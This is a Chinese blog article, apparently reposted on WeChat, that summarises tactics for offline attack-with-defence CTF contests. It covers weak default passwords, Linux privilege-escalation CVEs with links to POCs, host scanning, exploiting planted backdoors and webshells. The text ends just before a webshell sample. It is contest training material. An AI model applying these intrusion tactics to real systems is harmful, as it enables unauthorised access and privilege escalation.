<html>
<head>
<title>CTF线下AWD经验总结</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
CTF线下AWD经验总结
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    EDWARD&#39;s Blog
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2019-05-31</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><h2 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:20px;line-height:40px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">简介</a></h2><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">随着CTF的普及，比赛的形式也有了越来越多的花样，对于线下赛来说，常见为 AWD:Attack With Defence+公共高地、内网渗透等形式。</p><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">由于前段时间准备线下赛时，看了许多大佬们总结的套路，他们各种骚操作让我学到了许多，所以就想把几篇我觉得比较好的总结一下，一来方便自己比赛前回顾一下，二来跟大家分享，希望能对各位CTF朋友们有所帮助。</p><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">之后如果学到什么新姿势，我有时间也会update上来和大家分享:)</p><h4 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">何为AWD</h4><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p><ul style="" class=" list-paddingleft-2"><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析；</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">flag在主办方的设定下每隔一定时间刷新一轮</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">各队一般都有自己的初始分数</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">flag一旦被其他队伍拿走，该队扣除一定积分</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">扣除的积分由获取flag的队伍均分</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">主办方会对每个队伍的服务进行check，服务宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">一般每个队伍会给一个低权限用户，非root权限</span></p></li></ul><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);"><p style="margin-bottom: 25px;">具体规则以具体比赛规则为准，但一般大同小异</p></blockquote><h4 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">网络环境</h4><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">网络拓扑如下图所示（示例）：</p><p style="text-align: center;"><img class="rich_pages" data-backh="381" data-backw="556" data-before-oversubscription-url="https://mmbiz.qlogo.cn/mmbiz_png/Uq8Qfeuvouib5FAEGG1yRsq8Q86AVRuRHU5quFFzBrgb1L4ShhHyyWgK5Npz1UZDCb9PM4DBCBW3ugvje71sQAA/0?wx_fmt=png" data-ratio="0.6850393700787402" data-s="300,640" src="图片/HACK学习呀_2019-05-31_CTF线下AWD经验总结/1_Npz1UZDCb9PM4DBCBW3ugvje71sQAA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib5FAEGG1yRsq8Q86AVRuRHU5quFFzBrgb1L4ShhHyyWgK5Npz1UZDCb9PM4DBCBW3ugvje71sQAA/640?wx_fmt=png'" data-type="png" data-w="635" style="width: 100%;height: auto;"  /></p><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">首先先理清好网络拓扑关系，节点与各链路之间的关联，方便下一步和队友配合，要不然不知道对手在哪就GG。<br  /></p><h4 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">比赛分工</h4><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">线下赛一般3人左右，2人攻击，1人防御，因为发现的漏洞可以攻击其他队伍，也要进行修复，所以攻防相辅相成，以攻为守。</p><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">一般来说，比赛中每个队伍需要维护多个靶机，web、二进制等，也可以每人负责一台，各自负责攻击和防御。</p><h2 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:20px;line-height:40px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">套路小结</h2><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">常规的CTF线下攻防思路：</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.51875" data-s="300,640" src="图片/HACK学习呀_2019-05-31_CTF线下AWD经验总结/2_WOceSy1BfVbK5nOpMLMeDHh6NmZk7A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib5FAEGG1yRsq8Q86AVRuRH2UHA4u00ny9sZ1ZM29IkykibhWOceSy1BfVbK5nOpMLMeDHh6NmZk7A/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><h4 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">服务器登录</h4><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">一般比赛都通过ssh连接服务器，拿到网络拓扑图后，和队友进行分工，一个人检查有没有弱口令（弱口令的问题几乎是必考），有的话对密码进行修改（越复杂越好，当然前提是自己也方便）。web后台也很有可能存在弱口令，一般都是<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">admin/admin</code>&nbsp;，<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">admin/123456</code>，<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">test/test</code>等等，同样需要立即修改，并将情况反馈给队友，凭着你的手速修改其他队伍的后台口令，为本队所用，甚至有些严重的可以利用后台getshell。</p><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">与此同时，还需要（一定要！必须要！）有人在比赛开始后第一时间备份服务器中web目录下的文件（<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">/var/www/html</code>）。这是自我审计的基础，也是防止服务器在比赛中出现异常的情况下可以立即恢复到初始状态的先决条件。有的比赛可以提供3次左右的恢复初始设置的机会（但一般会伴随着扣分为代价），有的比赛不提供，所以备份十分重要。</p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);"><p style="margin-bottom: 25px;">可以用scp命令，也可用一些图形化的工具：Winscp，MobaXterm等，操作起来比较方便。</p></blockquote><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">接着就是上WAF、文件监控、端口扫描。将这几个工作分工好，顺序就像图上。</p><h4 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">提权</h4><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。</p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);"><p style="margin-bottom: 25px;">Linux_Local_Root_Exploits&nbsp;：这网站收集了许多linux本地提权的poc。</p><p style="margin-bottom: 25px;">linux-kernel-exploits(github)&nbsp;：一个挺全的提权exp项目，收集了04年至今的exp，并按年份和CVE归类</p></blockquote><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">下面分享几个最近两年并且影响范围比较大的：</p><ul style="" class=" list-paddingleft-2"><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">CVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 )&nbsp;：DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务（系统崩溃）或者提升权限，获得系统的管理访问权限</span></p></li><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">CVE-2016-5195(脏牛，kernel 2.6.22 &lt; 3.9 (x86/x64))&nbsp;：低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 0 即可提升为root权限</span></p></li><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">CVE-2016-8655(Ubuntu 12.04、14.04，Debian 7、8)&nbsp;：条件竞争漏洞，可以让低权限的进程获得内核代码执行权限</span></p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);"><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">POC：https://www.seebug.org/vuldb/ssvid-92567</span></p></blockquote></li><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">CVE-2017-1000367(sudo本地提权漏洞 )&nbsp;：Linux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。</span></p></li><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">CVE-2016-1247(Nginx权限提升漏洞)&nbsp;：Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。</span></p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);"><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">POC：https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span></p></blockquote></li></ul><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">我收集了一些提权的脚本工具集，可作参考：https://github.com/edwardchoijc/ctf-toolkit/Linux/getROOT</p><h4 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">How to Attack</h4><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">主机发现</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">如果是在同个C段，或者B段，均可以使用扫描器进行扫描得出。还要记得扫端口，这很重要，当然这个端口扫描是建立在没有自己靶机权限的情况下。用nmap也行，自己写的脚本或者网上找的也行。</p><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">找预留后门</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">有的比赛环境，为了照顾比较菜的选手，预留了一句话后门，可以利用这个漏洞迅速打一波，还可以视情况“搅屎”，利用这个漏洞一直维持权限，每轮都得分。</p><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">将整个web目录下载到本地，使用hm.exe、D盾或者别的扫描工具可以扫描得出（如果预留）</p><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">发现后门后，第一时间删除，同时利用这个漏洞发起第一波攻击，如果利用菜刀连，显然不够优雅，还没连完，人家估计都删的差不多了，因此这个漏洞虽然是送分，但拼的是手速，因此得提前准备好脚本</p><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">代码审计</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">代码审计是攻防一体的工作，当发现漏洞时，修补的同时跟进攻的队友商讨如何利用</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.51875" data-s="300,640" src="图片/HACK学习呀_2019-05-31_CTF线下AWD经验总结/3_WOceSy1BfVbK5nOpMLMeDHh6NmZk7A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib5FAEGG1yRsq8Q86AVRuRH2UHA4u00ny9sZ1ZM29IkykibhWOceSy1BfVbK5nOpMLMeDHh6NmZk7A/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">一句话木马</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。</p><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">比较好的一句话：</p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t" mpa-from-tpl="t"><pre 